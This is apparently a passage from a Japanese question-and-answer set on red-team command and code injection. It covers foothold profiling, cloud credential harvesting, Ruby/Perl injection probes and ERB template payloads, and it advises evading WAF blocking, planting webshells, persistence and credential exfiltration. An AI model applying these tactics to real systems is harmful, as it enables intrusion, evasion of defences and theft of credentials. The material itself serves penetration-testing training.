**A4**: 「内向き/自前エコー」次元に転じる。出られないなら、対象が既に開放している内向きサービスを利用する。出力を web 可読ファイルに書いてこちらが GET する、こちらが照会できる API データに書く、あるいは注入点そのものをコマンド実行 API としてポーリングする。方向を「対象がこちらへ能動接続」から「こちらが対象を能動的に読む」へ反転する。
**Q5**: 帯外プロトコル選択の判断は他でも使えるか?
**A5**: 使える。あらゆるブラインド脆弱性(ブラインド SSRF、ブラインド XXE、ブラインド SQLi、デシリアライズ検証)で帯外チャネルを選ぶ必要があり、DNS 優先のロジックは汎用だ。「許可確率順に出口を探査する」方法を身につければ、帯外/戻りが必要な場面で素早く使えるチャネルを見つけられる。

### RCE 確認後にまず足場環境を判断する
**Q1**: コマンドインジェクションで実行を得た。深入りする前に、方向を誤らないためにまず何を判断すべきか?
**A1**: まず足場環境のプロファイリングを行い、後続戦略を決める。鍵の問いは、コンテナ内か(`/.dockerenv`、cgroup 特徴)、WAF/ロードバランサ/エッジノードでなく本当の業務ホストか、権限は何か(`id`)、ネットワーク位置はどこか(内部ネットワークセグメント、どこへ通じるか)。環境判断を誤ると権限昇格/横展開の方向が全て狂う。
**Q2**: コンテナ内かをどう素早く判断する?
**A2**: `/.dockerenv` の有無、`/proc/1/cgroup` に docker/kubepods が含まれるか、プロセスツリーが少数か、`hostname` がコンテナ ID 風か、mount 状況を見る。コンテナ内なら方向を「コンテナエスケープ/K8s メタデータ/service account token 探し」に転じ、従来のホスト権限昇格を進めない。
**Q3**: 実行ホストが WAF 機器かエッジプロキシで業務バックエンドでないようだ。どうする?
**A3**: これは重要な方向転換信号だ。エッジ機器では転送設定、バックエンドの実アドレス、TLS 秘密鍵、アクセスログ(他ユーザーの認証情報を含む)を読めるかもしれない。方向を「このマシンで権限昇格」から「エッジ位置を利用してバックエンド情報とトラフィックを取得」に転じ、エッジノードを足がかり兼情報源にする。
**Q4**: 環境判断で権限が極めて低く、制限されたコンテナ内に見え、先が見えない。どの直交次元に転じる?
**A4**: 「クラウドメタデータ/認証情報収集」に転じ、ローカル権限昇格に固執しない。制限されたコンテナ内で最も価値があるのは多くの場合、クラウド metadata endpoint(一時認証情報取得)、マウントされた secret/token、環境変数のデータベース/API 認証情報、到達可能な内部ネットワークサービスだ。方向を「本機権限の昇格」から「現在の身元で横展開/クラウド上へ行ける認証情報を収集」に転じる。
**Q5**: なぜ足場環境判断を深入り利用の前に置くのか?
**A5**: コンテナ/エッジ/クラウド環境の後続の攻め方は従来ホストと全く異なる。先入観で普通の Linux ホストとして権限昇格を猛攻すると、コンテナ内では完全に無効で時間を無駄にし、アラートも誘発する。2〜3 コマンドでまず「自分がどこに立っているか」を把握すれば、後続の各歩が正しい方向へ進む。これは熟練者の基本反射だ。

### 少数派言語(Ruby/Perl/Go など)のコードインジェクション識別
**Q1**: 対象の技術スタックが一般的な PHP/Java/Python/Node でなく、Ruby か Perl に見える。コードインジェクションを疑う。どう特定する?
**A1**: まずフィンガープリントで言語を確認する(Server header、エラーページ、cookie 名、Rails の `_session` のようなフレームワーク特徴、ルート傾向)。その言語の危険関数プローブを使う。Ruby は `eval`、`send`/`public_send`、`Kernel#open`(`|command` パイプ)、ERB テンプレート(`<%= %>`)、`Marshal.load`。Perl は `eval`、`open` の 2 引数(`open(F,"cmd|")`)、`system`/バッククォート、`/e` 正規表現。
**Q2**: Ruby の `open` がなぜコマンドインジェクション点か?どう探査する?
**A2**: Ruby の `Kernel#open`/`IO.read` は引数が `|` で始まると後ろをコマンドとして実行する(`open("|id")`)。ユーザー入力がこの種の open に入り先頭を制御できれば、`|sleep 5` を注入できる。探査はパラメータ値を `|command` 形式で渡して実行されるかを見る。これは Ruby 特有で、見落とされやすいコマンドインジェクションプリミティブだ。
**Q3**: ERB/Slim/Haml テンプレート注入(Ruby SSTI)と判定した。RCE へどう進む?
**A3**: Ruby SSTI では `<%= %>` 内で直接 Ruby を実行できる。`<%= `id` %>`(バッククォート)か `<%= system('id') %>` がコマンド実行で、多くの言語の SSTI より直接的だ(Ruby テンプレートは本来的にコード埋め込み)。`<%= 7*7 %>` が 49 を出すと特定したら RCE までの距離は非常に短く、直接 system/バッククォートを打つ。
**Q4**: 言語プローブがどれも一致せず、言語すら判定できない。この道が詰まったらどう転じる?
**A4**: 「汎用コマンドインジェクションプローブ」で下支えする。どの言語でも、下層で shell を呼ぶコマンドインジェクションは統一の `;sleep`/帯外で測れ、言語識別に依存しない。まず言語非依存の shell プローブでコマンド層注入の有無を確認してから、言語を精確にする。言語がわからなくても詰まらせない。shell 層は各言語に共通の収束点だ。
**Q5**: 主流の数言語だけでなく少数派言語の知識をわざわざ用意する理由は?
**A5**: 実際の対象の技術スタックは多様で、Go/Rust/Ruby/Perl/Lua/Elixir に出会うと主流 payload は全て使えない。「先にフィンガープリントで言語を定め→その言語の危険関数を調べ→対応プローブを打つ」という汎用手法を身につけるほうが、数言語の固定 payload を暗記するより実戦に適応できる。特定能力の核心は手法であって payload ライブラリではない。

### 注入が間欠的に成功する根本原因の特定
**Q1**: コマンドインジェクションの payload が時に成功し時に失敗する。同一リクエストを反復しても結果が一貫しない。原因をどう特定する?
**A1**: ランダムと諦めず、間欠性には通常確定した根本原因がある。第一の疑いは、バックエンドがロードバランスの複数インスタンスで、一部のインスタンスだけに脆弱性がある/一部だけ WAF が覆うことだ。判定基準:複数回送って成功率が固定比率に近いか(例 1/3 成功→バックエンド 3 台のうち 1 台に穴)。そうなら、ルーティングを固定して(session/特定 header/cookie の粘着)穴のあるインスタンスへ寄せる。
**Q2**: 成功率が固定比率でなく、打つほど失敗する。どういうことか?
**A2**: WAF の動的遮断かレート制限を誘発した可能性がある。最初の数発は成功し、その後 IP/session が制限される。判定基準:IP/session を替えると成功が戻る。減速(頻度を下げる)、出口 IP を交代する、より隠密な payload でリスクスコアの蓄積を避ける。間欠失敗は「段階的に遮断される」信号だ。
**Q3**: ロードバランスと遮断を排除しても、まだ不安定だ。何が考えられる?
**A3**: 競合/非同期かもしれない。注入コマンドの実行が並行状態、一時ファイル、非同期キューに依存し、タイミングが合わないと失敗する。あるいはキャッシュで、レスポンスがキャッシュされて今回の実行でなく旧結果が見えている。判定基準:ランダムな cache-buster パラメータを加える、リクエスト間隔を空ける、並行量との相関を見る。
**Q4**: 各種根本原因を調べても無規則だ。この不安定な道の利用が難しい。どこへ転じる?
**A4**: 「単発成功の価値を高める」戦略に転じる。安定しにくいなら、成功のたびにできるだけ多く産出させる。一度成功すれば即 webshell を落とす/スケジュールタスクを加える/公開鍵を書く/認証情報を一括持ち出す。この不安定な注入点に毎回依存することを、「一度の成功で安定した足場に換える」ことに変える。
**Q5**: 間欠成功が真剣な特定に値するのはなぜか?直接諦めないのか?
**A5**: 間欠成功は脆弱性が確かに存在することを示しており、諦めるのは惜しい。根本原因(複数バックエンド/遮断/キャッシュ/競合)は一度特定すれば往々にして安定利用に転化できる。多くの人が「不安定」を「穴なし」と誤認して逃す。熟練者は不安定を解くべき手掛かりとして追い、これが出荷率の差になる。

### WAF が遮断を誘発した後の方向転換
**Q1**: 打っているうちに IP が WAF に封じられた(403/接続リセット/チャレンジページ)。どう特定と利用を続ける?
**A1**: まず遮断の粒度と期間を確認する。IP 遮断か、session/cookie 遮断か、フィンガープリント(TLS/UA)遮断か。正常リクエストを一つ送って全体が到達不能か注入だけが遮断かを測る。これで回復手段を選ぶ。IP を替える(プロキシプール/クラウド関数出口)、session を消す、クライアントフィンガープリントを替える。遮断次元を特定して初めて症状に応じて解除できる。
**Q2**: IP を替えてもすぐ封じられる。何を示し、どうする?
**A2**: 遮断が行動特徴(高頻度、payload 特徴)に依拠し、単なる IP ではないことを示す。騒音低減に転じる。リクエスト頻度を大幅に下げる、攻撃特徴の明らかな payload を外す、探査リクエストを正常トラフィックのリズムに混ぜる。遮断の本質は「リスクスコアが閾値に蓄積」であり、リクエストごとのリスクスコアを下げるか、蓄積速度を落とす。
**Q3**: 遮断が厳しく(IP を替えても続けにくい)、この正面硬攻の道が通らない。どの直交次元に転じる?
**A3**: 「必要なリクエスト数を減らす」に転じる。最少リクエストで最大成果を取る。数発しか打てずに封じられるなら、文字ごとのブラインド注入のような大量リクエスト操作をせず、一発の帯外確認、一発の足場確保の永続化(webshell/公開鍵)に変え、以降はこの WAF 監視下の注入点から離れ、確立した独立チャネルで続ける。戦略を「複数回の対話」から「一撃で点を建てる」へ変える。
**Q4**: webshell を既に建てたが同じ WAF の後ろにあり、webshell へのアクセスも遮断される。どうする?
**A4**: 隠密チャネルに替える。webshell を暗号/難読化トラフィックにする、正常パラメータに隠す、あるいはリバース/フォワード接続で web チャネルを迂回する(非 HTTP ポート経由)。「WAF の検出面を通らない通信」に転じ、WAF の目の前で反復誘発しない。永続化の価値は、WAF の見えない道に替えられる点にある。
**Q5**: 最初からどうすれば封じられるリスクを減らせるか?
**A5**: 予測を優先する。手始めに低頻度で偵察し、先に帯外確認(一発で得る)、確認後すぐ独立した足場を建て、高危険の大量操作(ブラインド注入列挙、ディレクトリブルートフォース)は安定したチャネルを得てから内部で行う。特定段階から「リクエスト予算を節約し、早く監視チャネルを離れる」意識を持てば、遮断誘発の確率を大幅に下げられる。

### ブラックボックス開始:注入点特定の優先順位と予算配分
**Q1**: 大きなアプリを前に時間が限られる。コマンド/コードインジェクションの特定にどう精力を配分し、無頭の蝿のようにぶつからないか?
**A1**: 「命中確率 × 危害 ÷ コスト」で並べる。まず低コスト高確率から。高危険機能(ping/変換/エクスポートなど)+明らかなパラメータを、帯外プローブで素早く一巡する。次に中コスト。二次入力チャネル(header/ファイル名)、認証が必要な機能。最後に高コスト。文字ごとのブラックリスト地図、二段階ブラインドテスト。少数の高価値探査でまず大面を覆い、単点を深掘りしない。
**Q2**: 一つの疑わしい点に長く費やしすぎないためには?
**A2**: タイムボックスを設ける。各疑わしい点に探査予算(N 回のリクエスト / M 分)を定め、時間に達して正の信号がなければ「再訪待ち」とマークして次へ転じる。レッドチーム最大の浪費は単点への執着だ。幅優先で「信号のある」点を全て洗い出し、信号の最も強い点に深入りするほうが、深さ優先で一点にぶつかるより高効率だ。
**Q3**: 同時に複数の疑わしい注入点がある。どれに先に深入りする?
**A3**: 「信号が最も確定 + RCE までの距離が最短 + 権限/位置が最良」の点を選ぶ。帯外命中済み > 時間遅延のみ > 純粋な推測。直接 shell コンテキスト > 複雑なサンドボックスエスケープが必要。高権限プロセス/核心ホスト上 > エッジ低権限。限られた深入り予算を期待成果の最も高い点に投じる。
**Q4**: 高確率の点を全てスキャンして正の信号がない。大面の網羅が失敗した。どこへ転じる?
**A4**: 「前提仮定を下げる」と「攻撃面カテゴリを替える」に転じる。第一歩は未網羅の入力源がないか再検査する(認証後機能、多段フローの中間状態、WebSocket、GraphQL、ファイル内容)。第二歩は横方向にカテゴリを替える。コマンド/コードインジェクションが唯一の出荷点ではない。SSRF、デシリアライズ、アップロード、ロジック脆弱性、既知コンポーネント CVE のほうが近いかもしれない。「コマンドインジェクションを見つけねば」と固執しない。
**Q5**: この優先順位思考と具体的なコマンドインジェクション技術の関係は?
**A5**: 技術は「ある点を突破できるか」を決め、優先順位思考は「その技術をどの点に、どれだけの時間使うか」を決める。実戦では後者が前者より成否を左右することが多い。どんなに強い迂回技術でも、低価値の点に使うか、損切りすべき時に損切りしなければ成果は出ない。特定の最高層の能力は資源の配分だ。正しい点、正しい時間、正しい深さで投入する。
